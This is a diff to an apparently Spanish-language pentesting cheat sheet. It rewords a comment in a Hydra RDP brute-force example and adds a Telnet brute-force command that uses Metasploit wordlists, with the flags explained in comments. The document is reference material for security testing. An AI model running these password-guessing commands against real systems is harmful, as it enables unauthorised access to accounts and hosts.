@@ -177,7 +177,7 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 ## Hydra fuerza bruta RDP
 
 ```python 
-# Fuerza bruta en RDP
+# Fuerza bruta a RDP
 ❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP> -s 3333           
 
 	# L = Ruta o archivo que contiene los usuarios para login 
@@ -185,5 +185,12 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 	# s = Especificas el puerto, si no lo haces Hydra asumira que es el puerto 3389
 ```
 
+## Hydra fuerza bruta Telnet 
 
+```bash 
+❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> telnet 
+
+	# L = Ruta o archivo que contiene los usuarios para login 
+	# P = Ruta o archivo que contiene las passwd
+```
 
